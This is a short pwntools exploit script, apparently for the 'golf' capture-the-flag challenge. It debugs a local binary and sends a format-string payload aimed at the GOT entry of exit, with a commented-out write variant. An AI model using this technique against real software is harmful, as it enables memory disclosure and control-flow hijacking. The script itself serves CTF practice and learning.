from os import system
import sys
from pwn import *

# io = remote("golf.chal.imaginaryctf.org", 1337)
io = process("./chall")

gdb.attach(io, '''
   break *0x401254
''')

addr_main_top = 0x40121b
addr_text_sec_top = addr_main_top - 331
addr_libc_csu_init = addr_main_top + 103 + 14
addr_pltsec_sec_top = addr_text_sec_top - 0x10e0 + 0x1090
addr_exit_got = 0x404038

# payload = b'%96c%8$hhn'
payload = b'%8$s'
payload += b'\x00' * (0x10 - len(payload))
payload += p64(addr_exit_got)

io.sendline(payload)

io.interactive()